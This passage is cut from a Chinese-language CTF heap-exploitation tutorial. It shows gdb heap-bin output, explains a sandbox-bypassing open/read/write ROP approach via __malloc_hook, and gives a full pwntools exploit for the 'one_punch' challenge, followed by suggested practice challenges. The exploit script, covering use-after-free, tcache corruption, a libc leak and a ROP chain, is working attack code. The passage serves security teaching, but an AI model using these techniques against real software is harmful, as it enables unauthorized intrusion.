(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x55555555d9d0 (size : 0x1c630) 
       last_remainder: 0x55555555cc80 (size : 0x100) 
            unsortbin: 0x0
(0x030)  smallbin[ 1]: 0x555555559ba0
(0x100)  smallbin[14]: 0x55555555cc80 (doubly linked list corruption 0x55555555cc80 != 0x700 and 0x55555555cc80 is broken)          
(0x100)   tcache_entry[14](7): 0x55555555cc90 --> 0x55555555a3f0 --> 0x55555555a2f0 --> 0x55555555a1f0 --> 0x55555555a0f0 --> 0x555555559ff0 --> 0x555555559ab0
(0x130)   tcache_entry[17](7): 0x555555559980 --> 0x555555559850 --> 0x555555559720 --> 0x5555555595f0 --> 0x5555555594c0 --> 0x555555559390 --> 0x555555559260
(0x210)   tcache_entry[31](144): 0
(0x220)   tcache_entry[32](77): 0x55555555d7c0 --> 0x7ffff7fb4c30
(0x230)   tcache_entry[33](251): 0
(0x240)   tcache_entry[34](247): 0
(0x250)   tcache_entry[35](255): 0
(0x260)   tcache_entry[36](127): 0
(0x410)   tcache_entry[63](7): 0x55555555bd50 --> 0x55555555b940 --> 0x55555555b530 --> 0x55555555b120 --> 0x55555555ad10 --> 0x55555555a900 --> 0x55555555a4f0
gdb-peda$ x/4gx 0x000055555555901f+0x10
0x55555555902f: 0x00007ffff7fb4d90      0x0000000000000000
0x55555555903f: 0x0000000000000000      0x0000000000000000
```
由於沙箱保護，我們無法執行 `execve` 函數調用，只能通過 `open/read/write` 來讀取 flag 。我們選擇通過調用後門函數修改 `__malloc_hook` 爲 `gadget(mov eax, esi ; add rsp, 0x48 ; ret)` ，以便 add 的時候將 `rsp` 改到可控的輸入區域調用 `rop chains` 來 `orw` 讀取 `flag` 。

完整 exp 如下：

```python
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./one_punch')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./one_punch')

def Add(idx,name):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil("idx: ")
    p.sendline(str(idx))
    p.recvuntil("hero name: ")
    p.send(name)


def Edit(idx,name):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil("idx: ")
    p.sendline(str(idx))
    p.recvuntil("hero name: ")
    p.send(name)

def Show(idx):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil("idx: ")
    p.sendline(str(idx))

def Delete(idx):
    p.recvuntil('> ')
    p.sendline('4')
    p.recvuntil("idx: ")
    p.sendline(str(idx))

def BackDoor(buf):
    p.recvuntil('> ')
    p.sendline('50056')
    sleep(0.1)
    p.send(buf)

def exp():
    #leak heap
    for i in range(7):
        Add(0,'a'*0x120)
        Delete(0)
    Show(0)
    p.recvuntil("hero name: ")
    heap_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 0x850
    log.success("[+]heap base => "+ hex(heap_base))
    #leak libc
    Add(0,'a'*0x120)
    Add(1,'a'*0x400)
    Delete(0)
    Show(0)
    p.recvuntil("hero name: ")
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - (0x902ca0-0x71e000)
    log.success("[+]libc base => " + hex(libc_base))
    #
    for i in range(6):
        Add(0,'a'*0xf0)
        Delete(0)
    for i in range(7):
        Add(0,'a'*0x400)
        Delete(0)
    Add(0,'a'*0x400)
    Add(1,'a'*0x400)
    Add(1,'a'*0x400)
    Add(2,'a'*0x400)
    Delete(0)#UAF
    Add(2,'a'*0x300)
    Add(2,'a'*0x300)
    #agagin
    Delete(1)#UAF
    Add(2,'a'*0x300)
    Add(2,'a'*0x300)
    Edit(2,'./flag'.ljust(8,'\x00'))
    Edit(1,'a'*0x300+p64(0)+p64(0x101)+p64(heap_base+(0x000055555555c460-0x555555559000))+p64(heap_base+0x1f))

    #trigger
    Add(0,'a'*0x217)

    Delete(0)
    Edit(0,p64(libc_base+libc.sym['__malloc_hook']))
    #gdb.attach(p,'b calloc')
    Add(0,'a'*0xf0)

    BackDoor('a')
    #mov eax, esi ; add rsp, 0x48 ; ret
    #magic_gadget = libc_base + libc.sym['setcontext']+53
    # add rsp, 0x48 ; ret
    magic_gadget = libc_base + 0x000000000008cfd6
    payload = p64(magic_gadget)

    BackDoor(payload)

    p_rdi = libc_base + 0x0000000000026542
    p_rsi = libc_base + 0x0000000000026f9e
    p_rdx = libc_base + 0x000000000012bda6
    p_rax = libc_base + 0x0000000000047cf8
    syscall = libc_base + 0x00000000000cf6c5
    rop_heap = heap_base + 0x44b0

    rops = p64(p_rdi)+p64(rop_heap)
    rops += p64(p_rsi)+p64(0)
    rops += p64(p_rdx)+p64(0)
    rops += p64(p_rax)+p64(2)
    rops += p64(syscall)
    #rops += p64(libc.sym['open'])
    #read
    rops += p64(p_rdi)+p64(3)
    rops += p64(p_rsi)+p64(heap_base+0x260)
    rops += p64(p_rdx)+p64(0x70)
    rops += p64(p_rax)+p64(0)
    rops += p64(syscall)
    #rops += p64(libc.sym['read'])
    #write
    rops += p64(p_rdi)+p64(1)
    rops += p64(p_rsi)+p64(heap_base+0x260)
    rops += p64(p_rdx)+p64(0x70)
    rops += p64(p_rax)+p64(1)
    rops += p64(syscall)
    Add(0,rops)
    p.interactive('$ xmzyshypnc')

exp()
```

### 0x06 建議習題：

* 2018 HITCON children_tcache
* 2018 BCTF houseOfAtum
* 2019 HTICON Lazy House
* 2020 XCTF no-Cov twochunk
